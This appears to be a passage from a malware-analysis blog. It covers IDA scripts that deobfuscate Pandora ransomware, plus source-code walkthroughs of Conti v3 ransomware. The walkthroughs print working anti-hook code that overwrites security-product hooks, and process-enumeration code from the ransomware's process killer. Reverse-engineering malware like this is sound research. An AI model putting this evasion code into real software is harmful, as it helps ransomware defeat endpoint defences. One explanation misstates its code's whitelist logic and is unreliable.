bb_ptr &lt; ptr: if 'setl' == print_insn_mnem(bb_ptr): jmp_condition = 'setl' break elif 'setz' == print_insn_mnem(bb_ptr): jmp_condition = 'setz' break elif 'setnz' == print_insn_mnem(bb_ptr): jmp_condition = 'setnz' break bb_ptr = next_head(bb_ptr) jmp_condition_address = bb_ptr # Check results of cmov find if jmp_condition is None: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't contain setl or setz, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue else: # This bb doesn't match our pattern skip it print(f&quot;BB at {hex(bb_start)} doesn't match pattern, skip it&quot;) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr continue print(f&quot;Dispatcher bb {hex(bb_start)}&quot;) bb_table.append((bb_start,ptr,eax_cmp_value,jmp_condition,jmp_condition_address,reg_name)) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: # This is code bb don't save it print(f&quot;Original code bb {hex(bb_start)}&quot;) bb_orig_table.append(bb_start) ptr = next_head(ptr) while not is_code(ida_bytes.get_full_flags(ptr)): ptr = next_head(ptr) bb_start = ptr else: ptr = next_head(ptr)bb_orig_table = [0x7ff6654a687f, 0x7ff6654a691a, 0x7ff6654a6a04, 0x7ff6654a6a84, 0x7ff6654a6ad1, 0x7ff6654a6b3b, 0x7ff6654a6b9b, 0x7ff6654a6bf3, 0x7ff6654a6c61, 0x7ff6654a6cfd, 0x7ff6654a6e9f, 0x7ff6654a6ef8, 0x7ff6654a6f58, 0x7ff6654a7024]bb_table = [(0x7ff6654a67f0, 0x7ff6654a6817, 0x10bc6c78, 'cmovl', 0x7ff6654a67fa, 'rdx'), (0x7ff6654a6819, 0x7ff6654a682e, 0xffffffffc30bae2e, 'cmovl', 0x7ff6654a6823, 'rdx'), (0x7ff6654a6830, 0x7ff6654a6845, 0xffffffffa2992627, 'cmovl', 0x7ff6654a683a, 'rdx'), (0x7ff6654a6847, 0x7ff6654a6861, 0xffffffffa22a16af, 'cmovl', 0x7ff6654a6856, 'rdx'), (0x7ff6654a6863, 0x7ff6654a687d, 0xffffffff8cbc0434, 'cmovz', 0x7ff6654a6872, 'rcx'), (0x7ff6654a68b0, 0x7ff6654a68c5, 0x6c249751, 'cmovl', 0x7ff6654a68ba, 'rdx'), (0x7ff6654a68c7, 0x7ff6654a68e1, 0x3b2b8a1e, 'cmovl', 0x7ff6654a68d6, 'rdx'), (0x7ff6654a68e3, 0x7ff6654a68fd, 0x173ba5e1, 'cmovl', 0x7ff6654a68f2, 'rdx'), (0x7ff6654a68ff, 0x7ff6654a6918, 0x10bc6c78, 'setz', 0x7ff6654a6906, 'rcx'), (0x7ff6654a69b0, 0x7ff6654a69ca, 0xffffffffd43fb344, 'cmovl', 0x7ff6654a69bf, 'rdx'), (0x7ff6654a69cc, 0x7ff6654a69e6, 0xffffffffcef7092e, 'cmovl', 0x7ff6654a69db, 'rdx'), (0x7ff6654a69e8, 0x7ff6654a6a02, 0xffffffffc30bae2e, 'cmovz', 0x7ff6654a69f7, 'rcx'), (0x7ff6654a6a30, 0x7ff6654a6a4a, 0x7d71a1e3, 'cmovl', 0x7ff6654a6a3f, 'rdx'), (0x7ff6654a6a4c, 0x7ff6654a6a66, 0x7a980236, 'cmovl', 0x7ff6654a6a5b, 'rdx'), (0x7ff6654a6a68, 0x7ff6654a6a82, 0x6c249751, 'cmovz', 0x7ff6654a6a77, 'rcx'), (0x7ff6654a6a99, 0x7ff6654a6ab3, 0xffffffffc094d6c9, 'cmovl', 0x7ff6654a6aa8, 'rdx'), (0x7ff6654a6ab5, 0x7ff6654a6acf, 0xffffffffa2992627, 'cmovz', 0x7ff6654a6ac4, 'rcx'), (0x7ff6654a6b09, 0x7ff6654a6b1e, 0x3cd69d30, 'setl', 0x7ff6654a6b10, 'rdx'), (0x7ff6654a6b20, 0x7ff6654a6b39, 0x3b2b8a1e, 'setnz', 0x7ff6654a6b27, 'rcx'), (0x7ff6654a6b63, 0x7ff6654a6b7d, 0xffffffffecce8ff1, 'cmovl', 0x7ff6654a6b72, 'rdx'), (0x7ff6654a6b7f, 0x7ff6654a6b99, 0xffffffffd43fb344, 'cmovz', 0x7ff6654a6b8e, 'rcx'), (0x7ff6654a6bbb, 0x7ff6654a6bd5, 0x7d9d86f3, 'cmovl', 0x7ff6654a6bca, 'rdx'), (0x7ff6654a6bd7, 0x7ff6654a6bf1, 0x7d71a1e3, 'cmovz', 0x7ff6654a6be6, 'rcx'), (0x7ff6654a6c45, 0x7ff6654a6c5f, 0xffffffffa22a16af, 'cmovz', 0x7ff6654a6c54, 'rcx'), (0x7ff6654a6ce1, 0x7ff6654a6cfb, 0x173ba5e1, 'cmovz', 0x7ff6654a6cf0, 'rcx'), (0x7ff6654a6e83, 0x7ff6654a6e9d, 0xffffffffcef7092e, 'cmovz', 0x7ff6654a6e92, 'rcx'), (0x7ff6654a6edc, 0x7ff6654a6ef6, 0x7a980236, 'cmovz', 0x7ff6654a6eeb, 'rcx'), (0x7ff6654a6f3d, 0x7ff6654a6f56, 0xffffffffc094d6c9, 'setz', 0x7ff6654a6f44, 'rcx'), (0x7ff6654a7008, 0x7ff6654a7022, 0x3cd69d30, 'cmovz', 0x7ff6654a7017, 'rcx'), (0x7ff6654a7052, 0x7ff6654a706c, 0xffffffffecce8ff1, 'cmovz', 0x7ff6654a7061, 'rcx')] bb_table means the Dispatcher bb, and this bb has two formats that uses (cmovl, cmovz) or uses (setl and setz) bb_orig_table means the origin payload bb Emulate Basic BlocksFor each dispatcher bb emulate the block both satisfying the condition and not satisfying it to produce both the jmp address for the conditional jmp and the jmp address for the unconditional jmp. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849DUMP_FILE = '13.25.dmp'from dumpulator import Dumpulatordp = Dumpulator(DUMP_FILE,quiet=True)bb_table = [(0x7ff6654a67f0, 0x7ff6654a6817, 0x10bc6c78, 'cmovl', 0x7ff6654a67fa, 'rdx'), (0x7ff6654a6819, 0x7ff6654a682e, 0xffffffffc30bae2e, 'cmovl', 0x7ff6654a6823, 'rdx'), (0x7ff6654a6830, 0x7ff6654a6845, 0xffffffffa2992627, 'cmovl', 0x7ff6654a683a, 'rdx'), (0x7ff6654a6847, 0x7ff6654a6861, 0xffffffffa22a16af, 'cmovl', 0x7ff6654a6856, 'rdx'), (0x7ff6654a6863, 0x7ff6654a687d, 0xffffffff8cbc0434, 'cmovz', 0x7ff6654a6872, 'rcx'), (0x7ff6654a68b0, 0x7ff6654a68c5, 0x6c249751, 'cmovl', 0x7ff6654a68ba, 'rdx'), (0x7ff6654a68c7, 0x7ff6654a68e1, 0x3b2b8a1e, 'cmovl', 0x7ff6654a68d6, 'rdx'), (0x7ff6654a68e3, 0x7ff6654a68fd, 0x173ba5e1, 'cmovl', 0x7ff6654a68f2, 'rdx'), (0x7ff6654a68ff, 0x7ff6654a6918, 0x10bc6c78, 'setz', 0x7ff6654a6906, 'rcx'), (0x7ff6654a69b0, 0x7ff6654a69ca, 0xffffffffd43fb344, 'cmovl', 0x7ff6654a69bf, 'rdx'), (0x7ff6654a69cc, 0x7ff6654a69e6, 0xffffffffcef7092e, 'cmovl', 0x7ff6654a69db, 'rdx'), (0x7ff6654a69e8, 0x7ff6654a6a02, 0xffffffffc30bae2e, 'cmovz', 0x7ff6654a69f7, 'rcx'), (0x7ff6654a6a30, 0x7ff6654a6a4a, 0x7d71a1e3, 'cmovl', 0x7ff6654a6a3f, 'rdx'), (0x7ff6654a6a4c, 0x7ff6654a6a66, 0x7a980236, 'cmovl', 0x7ff6654a6a5b, 'rdx'), (0x7ff6654a6a68, 0x7ff6654a6a82, 0x6c249751, 'cmovz', 0x7ff6654a6a77, 'rcx'), (0x7ff6654a6a99, 0x7ff6654a6ab3, 0xffffffffc094d6c9, 'cmovl', 0x7ff6654a6aa8, 'rdx'), (0x7ff6654a6ab5, 0x7ff6654a6acf, 0xffffffffa2992627, 'cmovz', 0x7ff6654a6ac4, 'rcx'), (0x7ff6654a6b09, 0x7ff6654a6b1e, 0x3cd69d30, 'setl', 0x7ff6654a6b10, 'rdx'), (0x7ff6654a6b20, 0x7ff6654a6b39, 0x3b2b8a1e, 'setnz', 0x7ff6654a6b27, 'rcx'), (0x7ff6654a6b63, 0x7ff6654a6b7d, 0xffffffffecce8ff1, 'cmovl', 0x7ff6654a6b72, 'rdx'), (0x7ff6654a6b7f, 0x7ff6654a6b99, 0xffffffffd43fb344, 'cmovz', 0x7ff6654a6b8e, 'rcx'), (0x7ff6654a6bbb, 0x7ff6654a6bd5, 0x7d9d86f3, 'cmovl', 0x7ff6654a6bca, 'rdx'), (0x7ff6654a6bd7, 0x7ff6654a6bf1, 0x7d71a1e3, 'cmovz', 0x7ff6654a6be6, 'rcx'), (0x7ff6654a6c45, 0x7ff6654a6c5f, 0xffffffffa22a16af, 'cmovz', 0x7ff6654a6c54, 'rcx'), (0x7ff6654a6ce1, 0x7ff6654a6cfb, 0x173ba5e1, 'cmovz', 0x7ff6654a6cf0, 'rcx'), (0x7ff6654a6e83, 0x7ff6654a6e9d, 0xffffffffcef7092e, 'cmovz', 0x7ff6654a6e92, 'rcx'), (0x7ff6654a6edc, 0x7ff6654a6ef6, 0x7a980236, 'cmovz', 0x7ff6654a6eeb, 'rcx'), (0x7ff6654a6f3d, 0x7ff6654a6f56, 0xffffffffc094d6c9, 'setz', 0x7ff6654a6f44, 'rcx'), (0x7ff6654a7008, 0x7ff6654a7022, 0x3cd69d30, 'cmovz', 0x7ff6654a7017, 'rcx'), (0x7ff6654a7052, 0x7ff6654a706c, 0xffffffffecce8ff1, 'cmovz', 0x7ff6654a7061, 'rcx')]bb_jmp_table = []def emulate_bb(bb_start, bb_end, eax_value, jmp_reg): dp.regs.eflags = 0 dp.regs.r15 = 0x190 dp.regs.r14 = 0x0FFFFFFFFAE6529F8 dp.regs.r13 = 0x10 dp.regs.r12 = 0x1B0 dp.regs.rcx = 0x00007FF6654A6CFD dp.regs.rax = eax_value dp.start(bb_start,end=bb_end) jmp_reg_value = dp.regs.__getattr__(jmp_reg) return jmp_reg_valuefor bb in bb_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] # plus or minus the eax_value is used to satisfied the asm code, so that we can get the jmp address if jmp_condition == 'cmovl' or jmp_condition == 'setl': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value - 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == 'cmovz' or jmp_condition == 'setz': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) elif jmp_condition == 'setnz': jmp_addr_satisfied = emulate_bb(bb_start, bb_end, eax_value + 1, jmp_register) jmp_addr_unsatisfied = emulate_bb(bb_start, bb_end, eax_value, jmp_register) print(f&quot;BB {hex(bb_start)}:{hex(bb_end)} - jmp_addr_satisfied: {hex(jmp_addr_satisfied)} - jmp_addr_unsatisfied: {hex(jmp_addr_unsatisfied)}&quot;) bb_jmp_table.append((bb_start,bb_end,eax_value,jmp_condition,jmp_condition_address,jmp_register,jmp_addr_satisfied,jmp_addr_unsatisfied))for bb in bb_jmp_table: print(bb) ida patchconditions cmovl setl————jl cmovz setz————jz setnz————jnz so why this??? 12345cmovl rdx, r12 ; Move if Less (SF!=OF)cmovz rdx, rbp ; Move if Zero (ZF=1)setz dl ; Set Byte if Zero (ZF=1)setl dl ; Set Byte if Less (SF!=OF)setnz dl ; Set Byte if Not Zero (ZF=0) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import struct bb_jmp_table = [(140696238057456, 140696238057495, 280783992, 'cmovl', 140696238057466, 'rdx', 140696238057497, 140696238057648), (140696238057497, 140696238057518, 18446744072686906926, 'cmovl', 140696238057507, 'rdx', 140696238057520, 140696238057904), (140696238057520, 140696238057541, 18446744072142530087, 'cmovl', 140696238057530, 'rdx', 140696238057543, 140696238058137), (140696238057543, 140696238057569, 18446744072135251631, 'cmovl', 140696238057558, 'rdx', 140696238057571, 140696238058565), (140696238057571, 140696238057597, 18446744071775716404, 'cmovz', 140696238057586, 'rcx', 140696238057599, 140696238057456), (140696238057648, 140696238057669, 1814337361, 'cmovl', 140696238057658, 'rdx', 140696238057671, 140696238058032), (140696238057671, 140696238057697, 992709150, 'cmovl', 140696238057686, 'rdx', 140696238057699, 140696238058249), (140696238057699, 140696238057725, 389785057, 'cmovl', 140696238057714, 'rdx', 140696238057727, 140696238058721), (140696238057727, 140696238057752, 280783992, 'setz', 140696238057734, 'rcx', 140696238057754, 140696238057456), (140696238057904, 140696238057930, 18446744072975528772, 'cmovl', 140696238057919, 'rdx', 140696238057932, 140696238058339), (140696238057932, 140696238057958, 18446744072886880558, 'cmovl', 140696238057947, 'rdx', 140696238057960, 140696238059139), (140696238057960, 140696238057986, 18446744072686906926, 'cmovz', 140696238057975, 'rcx', 140696238057988, 140696238057456), (140696238058032, 140696238058058, 2104599011, 'cmovl', 140696238058047, 'rdx', 140696238058060, 140696238058427), (140696238058060, 140696238058086, 2056782390, 'cmovl', 140696238058075, 'rdx', 140696238058088, 140696238059228), (140696238058088, 140696238058114, 1814337361, 'cmovz', 140696238058103, 'rcx', 140696238058116, 140696238057456), (140696238058137, 140696238058163, 18446744072645564105, 'cmovl', 140696238058152, 'rdx', 140696238058165, 140696238059325), (140696238058165, 140696238058191, 18446744072142530087, 'cmovz', 140696238058180, 'rcx', 140696238058193, 140696238057456), (140696238058249, 140696238058270, 1020697904, 'setl', 140696238058256, 'rdx', 140696238058272, 140696238059528), (140696238058272, 140696238058297, 992709150, 'setnz', 140696238058279, 'rcx', 140696238057456, 140696238058299), (140696238058339, 140696238058365, 18446744073387544561, 'cmovl', 140696238058354, 'rdx', 140696238058367, 140696238059602), (140696238058367, 140696238058393, 18446744072975528772, 'cmovz', 140696238058382, 'rcx', 140696238058395, 140696238057456), (140696238058427, 140696238058453, 2107475699, 'cmovl', 140696238058442, 'rdx', 140696238058455, 140696238057416), (140696238058455, 140696238058481, 2104599011, 'cmovz', 140696238058470, 'rcx', 140696238058483, 140696238057456), (140696238058565, 140696238058591, 18446744072135251631, 'cmovz', 140696238058580, 'rcx', 140696238058593, 140696238057456), (140696238058721, 140696238058747, 389785057, 'cmovz', 140696238058736, 'rcx', 140696238058749, 140696238057456), (140696238059139, 140696238059165, 18446744072886880558, 'cmovz', 140696238059154, 'rcx', 140696238059167, 140696238057456), (140696238059228, 140696238059254, 2056782390, 'cmovz', 140696238059243, 'rcx', 140696238059256, 140696238057456), (140696238059325, 140696238059350, 18446744072645564105, 'setz', 140696238059332, 'rcx', 140696238059352, 140696238057456), (140696238059528, 140696238059554, 1020697904, 'cmovz', 140696238059543, 'rcx', 140696238059556, 140696238057456), (140696238059602, 140696238059628, 18446744073387544561, 'cmovz', 140696238059617, 'rcx', 140696238059630, 140696238057456)]for bb in bb_jmp_table: bb_start = bb[0] bb_end = bb[1] eax_value = bb[2] jmp_condition = bb[3] jmp_condition_address = bb[4] jmp_register = bb[5] jmp_addr_satisfied = bb[6] jmp_addr_unsatisfied = bb[7] patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) #jz jnz jl address that satisfied the cmp eax,xxxxxx patch_jmp_start = patch_jmp_cond_start + 6 # long jump need 6 byte ,jmp need 5 byte jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) # jmp relative address if jmp_condition == 'cmovl' or jmp_condition == 'setl': # jl patch_jmp_condition = b'\\x0f\\x8c' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) elif jmp_condition == 'cmovz' or jmp_condition == 'setz': # jz patch_jmp_condition = b'\\x0f\\x84' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) elif jmp_condition == 'setnz': # jnz patch_jmp_condition = b'\\x0f\\x85' + struct.pack('&lt;i',jmp_rel_statisfied) patch_jmp = b'\\xe9' + struct.pack('&lt;i',jmp_rel) # calculat nops for end of patch total_bytes = bb_end - jmp_condition_address + 2 nop_count = total_bytes - 11 # 11 bytes for the patch + nops to fill space patch_bytes = patch_jmp_condition + patch_jmp + b'\\x90'* nop_count # patch the bytes patch_ptr = jmp_condition_address # print(&quot;ggod&quot;) for c in patch_bytes: patch_byte(patch_ptr, c) patch_ptr += 1 analysis1print(hex(patch_jmp_cond_start),hex(jmp_rel_statisfied),hex(patch_jmp_start),hex(jmp_rel)) output beblow 123456789101112131415161718192021222324252627282930313233343536patch_jmp_cond_start jmp_rel_statisfied patch_jmp_start jmp_rel0x7ff6654a67fa 0x19 0x7ff6654a6800 0xab0x7ff6654a6823 0x7 0x7ff6654a6829 0x1820x7ff6654a683a 0x7 0x7ff6654a6840 0x2540x7ff6654a6856 0x7 0x7ff6654a685c 0x3e40x7ff6654a6872 0x7 0x7ff6654a6878 -0x8d0x7ff6654a68ba 0x7 0x7ff6654a68c0 0x16b0x7ff6654a68d6 0x7 0x7ff6654a68dc 0x2280x7ff6654a68f2 0x7 0x7ff6654a68f8 0x3e40x7ff6654a6906 0xe 0x7ff6654a690c -0x1210x7ff6654a69bf 0x7 0x7ff6654a69c5 0x1990x7ff6654a69db 0x7 0x7ff6654a69e1 0x49d0x7ff6654a69f7 0x7 0x7ff6654a69fd -0x2120x7ff6654a6a3f 0x7 0x7ff6654a6a45 0x1710x7ff6654a6a5b 0x7 0x7ff6654a6a61 0x4760x7ff6654a6a77 0x7 0x7ff6654a6a7d -0x2920x7ff6654a6aa8 0x7 0x7ff6654a6aae 0x48a0x7ff6654a6ac4 0x7 0x7ff6654a6aca -0x2df0x7ff6654a6b10 0xa 0x7ff6654a6b16 0x4ed0x7ff6654a6b27 -0x33d 0x7ff6654a6b2d 0x90x7ff6654a6b72 0x7 0x7ff6654a6b78 0x4d50x7ff6654a6b8e 0x7 0x7ff6654a6b94 -0x3a90x7ff6654a6bca 0x7 0x7ff6654a6bd0 -0x40d0x7ff6654a6be6 0x7 0x7ff6654a6bec -0x4010x7ff6654a6c54 0x7 0x7ff6654a6c5a -0x46f0x7ff6654a6cf0 0x7 0x7ff6654a6cf6 -0x50b0x7ff6654a6e92 0x7 0x7ff6654a6e98 -0x6ad0x7ff6654a6eeb 0x7 0x7ff6654a6ef1 -0x7060x7ff6654a6f44 0xe 0x7ff6654a6f4a -0x75f0x7ff6654a7017 0x7 0x7ff6654a701d -0x8320x7ff6654a7061 0x7 0x7ff6654a7067 -0x87c patch_jmp_cond_start = jmp_condition_address jmp_rel_statisfied = jmp_addr_satisfied - (patch_jmp_cond_start + 6) patch_jmp_start = patch_jmp_cond_start + 6 jmp_rel = jmp_addr_unsatisfied - (patch_jmp_start + 5) this means","link":"/2022/04/13/Pandora-Ransomeware-fla-unpack/"},{"title":"anti-hook","text":"intropart of conti v3 Ransomeware, by the way, fucking the school’s midterm exam. I’m longing for the day becoming stronger in Virus Learning. 打开系统对应的文件导入kernel32.dll并获取文件路径,打开文件 1234567891011121314151617181920212223242526272829303132333435HMODULE hKernel32 = apLoadLibraryA(_STR(&quot;kernel32.dll&quot;));apGetModuleFileNameW(hmodule, moduleRealPath, MAX_PATH);hFile = pCreateFileW(moduleRealPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); if (!hFile) return; DWORD Size = 0; DWORD H; LARGE_INTEGER LargeInt; pGetFileSizeEx(hFile, &amp;LargeInt); Size = LargeInt.QuadPart; if (!Size) { pCloseHandle(hFile); return; }hFileMap = apCreateFileMappingW(hFile, NULL, PAGE_READONLY, 0, 0, NULL); if (!hFileMap) { pCloseHandle(hFile); return; }originDll = (LPBYTE)apMapViewOfFile(hFileMap, FILE_MAP_READ, 0, 0, Size); if (!originDll) { pCloseHandle(hFileMap); pCloseHandle(hFile); return; } 获取modules NT Header 在 IMAGE_DOS_HEADER 结构体中的 e_lfanew 成员指定了 NT 头的偏移为 000000f0。这两个范围中间就是 DOS stub 的偏移区域。 计算NT头的指针 1PNTHeader = ImageBase + dosHeader -&gt;e_Ifanew 根据NT_headers 找到OptionalHeader 1234567891011121314151617181920typedef struct _IMAGE_NT_HEADERS64 {DWORD Signature;IMAGE_FILE_HEADER FileHeader;IMAGE_OPTIONAL_HEADER64 OptionalHeader;} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;typedef struct _IMAGE_NT_HEADERS {DWORD Signature;IMAGE_FILE_HEADER FileHeader;IMAGE_OPTIONAL_HEADER32 OptionalHeader;} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32; Optional Headers 1234567891011121314151617181920212223242526272829303132typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; ULONGLONG ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; ULONGLONG SizeOfStackReserve; ULONGLONG SizeOfStackCommit; ULONGLONG SizeOfHeapReserve; ULONGLONG SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; IMAGE_DATA_DIRECTORY结构如下 检查文件位数，并获取IMAGE_DATA_DIRECTORY数据。12345678910111213141516171819202122// get the File Offset of the modules NT HeaderuiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew;if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic){ uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];}else{ if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { pCloseHandle(hFileMap); pCloseHandle(hFile); return; }} 然后根据uiBaseAddress和uiExportDir获取如下数据 export directory name pointers the array of addresses the array of name ordinals the number of exported functions 结构体_IMAGE_EXPORT_DIRECTORY 12345678910111213typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; 1234567891011121314151617181920// get the File Offset of the export directory uiExportDir = uiBaseAddress + Rva2Offset(((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress); // get the File Offset for the array of name pointers uiNameArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNames, uiBaseAddress); // get the File Offset for the array of addresses uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress); // get the File Offset for the array of name ordinals uiNameOrdinals = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress); // get a counter for the number of exported functions... dwCounter = ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;NumberOfNames; 获取导出函数表12345678910111213141516171819202122uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)-&gt;e_lfanew; if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe32magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS32) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { if (((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.Magic == pe64magic) { uiNameArray = (UINT_PTR) &amp; ((PIMAGE_NT_HEADERS64) uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]; } else { pCloseHandle(hFileMap); pCloseHandle(hFile); return; } }} 检查hook 遍历函数 检查是否有转发函数（这个概念还不是很清楚），若是则跳过 比较当前函数和系统中函数是否相同 若函数已经被hook，则利用函数的前5byte进行覆盖，即antihook 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859for (; dwCounter--; uiNameArray += sizeof(DWORD), uiNameOrdinals += sizeof(WORD)) { char* cpExportedFunctionName = (char*)(uiBaseAddress + Rva2Offset(DEREF_32(uiNameArray), uiBaseAddress)); uiAddressArray = uiBaseAddress + Rva2Offset(((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress); // use the functions name ordinal as an index into the array of name pointers // loop the uiAddressArray with the uiNameOrdinals uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD)); // compute the File Offset to the function code UINT_PTR funcAddr = uiBaseAddress + Rva2Offset(DEREF_32(uiAddressArray), uiBaseAddress); // pass the for bool isForwarder = isForwardedFunc((const void*)funcAddr); if (isForwarder) continue; void* funcHooked = apGetProcAddress(hmodule, cpExportedFunctionName); if (!funcHooked) continue; BYTE* p = (BYTE*)funcHooked; if (p[0] != 0xe9) { if (p[0] != 0xff) continue; if (p[1] != 0x25) continue; }#ifdef __MINGW32__ bool funcIsHooked = (memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0);#else bool funcIsHooked = m_memcmp((const void*)funcAddr, (const void*)funcHooked, 2) != 0;#endif // __MINGW32 if (!funcIsHooked) continue; DWORD oldProtect = 0; DWORD oldProtect1 = 0; /* typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD); VirtualProtectFunc pVirtualProtect = (VirtualProtectFunc)GetProcAddress(hKernel32, _STR(&quot;VirtualProtect&quot;)); */ if (!apVirtualProtect(funcHooked, 64, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) break; //memcpy((void*)funcHooked, (void*)funcAddr, 10); CopyMemory((void*)funcHooked, (void*)funcAddr, 10); if (!apVirtualProtect(funcHooked, 64, oldProtect, &amp;oldProtect1)) break;","link":"/2022/04/18/anti-hook/"},{"title":"Conti v3 Ransomeware Souce Code Analysis","text":"prockillermemorySnapshot pCreateToolhelp32Snapshot pProcess32FirstW pProcess32NextW 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &quot;prockiller.h&quot;#include &lt;TlHelp32.h&gt;#include &lt;winternl.h&gt;#include &quot;../api/getapi.h&quot;#include &quot;../obfuscation/MetaString.h&quot;#include &quot;../memory.h&quot;VOID process_killer::GetWhiteListProcess(__out PPID_LIST PidList){ HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnapShot == NULL) { return; } PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W); if (!pProcess32FirstW(hSnapShot, &amp;pe32)) { pCloseHandle(hSnapShot); return; } do { if (!plstrcmpiW(pe32.szExeFile, OBFW(L&quot;explorer.exe&quot;))) { PPID Pid = (PPID)m_malloc(sizeof(PID)); if (!Pid) { break; } Pid-&gt;dwProcessId = pe32.th32ProcessID; TAILQ_INSERT_TAIL(PidList, Pid, Entries); } } while (pProcess32NextW(hSnapShot, &amp;pe32)); pCloseHandle(hSnapShot);} 12345678910111213typedef struct tagPROCESSENTRY32W{ DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; // this process ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; // associated exe DWORD cntThreads; DWORD th32ParentProcessID; // this process's parent process LONG pcPriClassBase; // Base priority of process's threads DWORD dwFlags; WCHAR szExeFile[MAX_PATH]; // Path} PROCESSENTRY32W; szExeFile为进程运行文件路径 Whitelist把进程名不为explorer.exe的进程全都插入到白名单进程列表中。 123456#define TAILQ_INSERT_TAIL(head, elm, field) do { \\ TAILQ_NEXT((elm), field) = NULL; \\ (elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last; \\ *(head)-&gt;tqh_last = (elm); \\ (head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field); \\} while (0) globalset some global parameters,maybe used to build different character sample(extension,mutex…..) Extention DecryptionNote EncryptMode ALL_ENCRYPT 10 LOCAL_ENCRYPT 11 NETWORK_ENCRYPT 12 BACKUPS_ENCRYPT 13 PATH_ENCRYPT 14 IsProcKillerEnabled EncryptPath EncryptSize MutexName 